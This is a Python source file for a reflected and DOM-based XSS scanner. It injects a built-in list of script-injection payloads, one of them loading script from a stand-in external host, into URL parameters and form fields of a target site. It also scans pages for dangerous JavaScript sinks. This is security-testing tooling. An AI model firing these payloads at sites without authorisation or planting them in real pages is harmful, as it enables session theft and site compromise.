#!/usr/bin/env python3
import httpx
import urllib.parse
from typing import List, Tuple, Dict
import re
from html.parser import HTMLParser

# Common XSS payloads to test
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<marquee onstart=alert('XSS')>",
    "javascript:alert('XSS')",
    "<script>alert(document.domain)</script>",
    "<img src='x' onerror='alert(1)'>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    "<SCRIPT SRC=http://xss.example.com/xss.js></SCRIPT>",
]

class FormParser(HTMLParser):
    """Parse HTML to extract forms and their inputs"""
    
    def __init__(self):
        super().__init__()
        self.forms = []
        self.current_form = None
        self.current_input = None
    
    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        
        if tag == 'form':
            self.current_form = {
                'action': attrs_dict.get('action', ''),
                'method': attrs_dict.get('method', 'get').upper(),
                'inputs': []
            }
        
        elif tag in ['input', 'textarea', 'select'] and self.current_form is not None:
            input_data = {
                'type': attrs_dict.get('type', 'text'),
                'name': attrs_dict.get('name', ''),
                'value': attrs_dict.get('value', '')
            }
            if input_data['name']:  # Only add inputs with names
                self.current_form['inputs'].append(input_data)
    
    def handle_endtag(self, tag):
        if tag == 'form' and self.current_form is not None:
            self.forms.append(self.current_form)
            self.current_form = None

def log(msg, level='INFO'):
    """Simple logging function"""
    print(f'[{level}] {msg}')

def extract_forms(html_content: str) -> List[Dict]:
    """Extract all forms from HTML content"""
    parser = FormParser()
    try:
        parser.feed(html_content)
    except Exception as e:
        log(f'Error parsing HTML forms: {str(e)}', 'DEBUG')
    return parser.forms

def test_reflected_xss(url: str, timeout: int = 10) -> List[Dict]:
    """
    Test for reflected XSS vulnerabilities by injecting payloads into URL parameters and forms.
    
    Args:
        url: Target URL to test
        timeout: Request timeout in seconds
    
    Returns:
        List of dictionaries containing vulnerability details
    """
    vulnerabilities = []
    
    try:
        with httpx.Client(timeout=timeout, follow_redirects=True, verify=False) as client:
            # First, get the page to extract forms
            initial_response = client.get(url)
            forms = extract_forms(initial_response.text)
            
            # Parse URL to extract query parameters
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            
            # Test URL parameters (GET)
            if not params:
                # If no parameters in URL, try common parameter names
                common_params = ['q', 'search', 'query', 'keyword', 'term', 'id', 'page', 'url', 'redirect', 'name']
                params = {param: ['test'] for param in common_params}
            
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            # Test GET parameters
            for param_name in params.keys():
                log(f'Testing XSS on GET parameter: {param_name}', 'INFO')
                
                for payload in XSS_PAYLOADS:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    flat_params = {k: v[0] if isinstance(v, list) else v for k, v in test_params.items()}
                    
                    try:
                        response = client.get(base_url, params=flat_params)
                        
                        if payload in response.text:
                            if is_xss_vulnerable(response.text, payload):
                                vuln = {
                                    'type': 'reflected_xss',
                                    'method': 'GET',
                                    'parameter': param_name,
                                    'payload': payload,
                                    'url': str(response.url),
                                    'severity': 'high',
                                    'description': f'Reflected XSS found in GET parameter "{param_name}"'
                                }
                                vulnerabilities.append(vuln)
                                log(f'XSS FOUND: GET parameter {param_name} with payload: {payload[:50]}...', 'VULN')
                                break
                    
                    except httpx.TimeoutException:
                        log(f'Timeout testing {param_name}', 'WARN')
                        break
                    except Exception as e:
                        log(f'Error testing {param_name}: {str(e)[:100]}', 'DEBUG')
                        continue
            
            # Test forms (POST/GET based on form method)
            if forms:
                log(f'Found {len(forms)} form(s) to test', 'INFO')
                
                for form_idx, form in enumerate(forms):
                    if not form['inputs']:
                        continue
                    
                    form_action = form['action']
                    # Resolve relative form action URLs
                    if form_action:
                        form_url = urllib.parse.urljoin(url, form_action)
                    else:
                        form_url = url
                    
                    log(f'Testing form {form_idx + 1} ({form["method"]}) with {len(form["inputs"])} input(s)', 'INFO')
                    
                    # Test each input field in the form
                    for input_field in form['inputs']:
                        if input_field['type'] in ['submit', 'button', 'image']:
                            continue  # Skip non-data inputs
                        
                        field_name = input_field['name']
                        log(f'Testing form input: {field_name}', 'INFO')
                        
                        for payload in XSS_PAYLOADS:
                            # Build form data with payload in the tested field
                            form_data = {}
                            for inp in form['inputs']:
                                if inp['name'] == field_name:
                                    form_data[inp['name']] = payload
                                else:
                                    form_data[inp['name']] = inp['value'] or 'test'
                            
                            try:
                                if form['method'] == 'POST':
                                    response = client.post(form_url, data=form_data)
                                else:
                                    response = client.get(form_url, params=form_data)
                                
                                if payload in response.text:
                                    if is_xss_vulnerable(response.text, payload):
                                        vuln = {
                                            'type': 'reflected_xss',
                                            'method': form['method'],
                                            'parameter': field_name,
                                            'payload': payload,
                                            'url': form_url,
                                            'severity': 'high',
                                            'description': f'Reflected XSS found in {form["method"]} form input "{field_name}"'
                                        }
                                        vulnerabilities.append(vuln)
                                        log(f'XSS FOUND: {form["method"]} form input {field_name} with payload: {payload[:50]}...', 'VULN')
                                        break
                            
                            except httpx.TimeoutException:
                                log(f'Timeout testing form input {field_name}', 'WARN')
                                break
                            except Exception as e:
                                log(f'Error testing form input {field_name}: {str(e)[:100]}', 'DEBUG')
                                continue
    
    except Exception as e:
        log(f'XSS scanner error: {str(e)}', 'ERROR')
    
    return vulnerabilities

def test_dom_xss(url: str, timeout: int = 10) -> List[Dict]:
    """
    Test for potential DOM-based XSS by looking for dangerous JavaScript patterns.
    
    Args:
        url: Target URL to test
        timeout: Request timeout in seconds
    
    Returns:
        List of dictionaries containing vulnerability details
    """
    vulnerabilities = []
    found_patterns = set()  # Track which patterns we've already reported
    
    # Dangerous JavaScript patterns that could lead to DOM XSS
    dangerous_patterns = [
        r'document\.write\s*\(',
        r'document\.writeln\s*\(',
        r'\.innerHTML\s*=',
        r'\.outerHTML\s*=',
        r'eval\s*\(',
        r'setTimeout\s*\(',
        r'setInterval\s*\(',
        r'Function\s*\(',
        r'location\.href\s*=',
        r'location\.replace\s*\(',
        r'location\.assign\s*\(',
    ]
    
    try:
        with httpx.Client(timeout=timeout, follow_redirects=True, verify=False) as client:
            response = client.get(url)
            
            for pattern in dangerous_patterns:
                matches = re.finditer(pattern, response.text, re.IGNORECASE)
                match_count = 0
                first_context = None
                
                for match in matches:
                    match_count += 1
                    # Only store the first match context
                    if first_context is None:
                        start = max(0, match.start() - 50)
                        end = min(len(response.text), match.end() + 50)
                        first_context = response.text[start:end].replace('\n', ' ')
                
                # Only report this pattern once, even if found multiple times
                if match_count > 0 and pattern not in found_patterns:
                    found_patterns.add(pattern)
                    
                    # Include count in description if multiple instances found
                    if match_count > 1:
                        description = f'Potentially dangerous JavaScript pattern found ({match_count} instances): {pattern}'
                    else:
                        description = f'Potentially dangerous JavaScript pattern found: {pattern}'
                    
                    vuln = {
                        'type': 'potential_dom_xss',
                        'pattern': pattern,
                        'count': match_count,
                        'context': first_context,
                        'severity': 'medium',
                        'description': description
                    }
                    vulnerabilities.append(vuln)
                    log(f'DOM XSS pattern: {pattern} ({match_count} instance{"s" if match_count > 1 else ""})', 'VULN')
    
    except Exception as e:
        log(f'DOM XSS scanner error: {str(e)}', 'ERROR')
    
    return vulnerabilities

def is_xss_vulnerable(response_text: str, payload: str) -> bool:
    """
    Check if the response indicates a potential XSS vulnerability.
    
    Args:
        response_text: HTML response text
        payload: The XSS payload that was injected
    
    Returns:
        bool: True if potentially vulnerable, False otherwise
    """
    # Check if payload exists in response unescaped
    if payload not in response_text:
        return False
    
    # Look for the payload in dangerous contexts
    dangerous_contexts = [
        f'<script>{payload}',  # Direct script injection
        f'>{payload}<',  # Between tags
        f'"{payload}"',  # In attribute values
        f"'{payload}'",  # In single-quoted attributes
    ]
    
    # Check for HTML entity encoding (which would prevent XSS)
    encoded_chars = ['&lt;', '&gt;', '&quot;', '&#', '&amp;']
    payload_context_start = response_text.find(payload)
    
    if payload_context_start == -1:
        return False
    
    # Check a small window around the payload
    context_start = max(0, payload_context_start - 20)
    context_end = min(len(response_text), payload_context_start + len(payload) + 20)
    context = response_text[context_start:context_end]
    
    # If the payload or its context contains encoded characters, it's likely safe
    for encoded_char in encoded_chars:
        if encoded_char in context:
            return False
    
    # Check if payload is in a dangerous context
    for dangerous_context in dangerous_contexts:
        if dangerous_context in response_text:
            return True
    
    # If payload contains script tags or event handlers and isn't encoded, likely vulnerable
    if any(keyword in payload.lower() for keyword in ['<script', 'onerror', 'onload', 'javascript:']):
        return True
    
    return False

def check_xss(url: str, timeout: int = 10) -> List[Dict]:
    """
    Main XSS checking function that runs all XSS tests.
    
    Args:
        url: Target URL to test
        timeout: Request timeout in seconds
    
    Returns:
        List of dictionaries containing all XSS vulnerabilities found
    """
    log(f'Running XSS scanner on {url}', 'INFO')
    
    all_vulnerabilities = []
    
    # Test for reflected XSS (GET params and forms)
    reflected_vulns = test_reflected_xss(url, timeout)
    all_vulnerabilities.extend(reflected_vulns)
    
    # Test for DOM-based XSS patterns
    dom_vulns = test_dom_xss(url, timeout)
    all_vulnerabilities.extend(dom_vulns)
    
    if all_vulnerabilities:
        log(f'Found {len(all_vulnerabilities)} XSS vulnerability(ies) on {url}', 'VULN')
    else:
        log(f'No XSS vulnerabilities found on {url}', 'INFO')
    
    return all_vulnerabilities
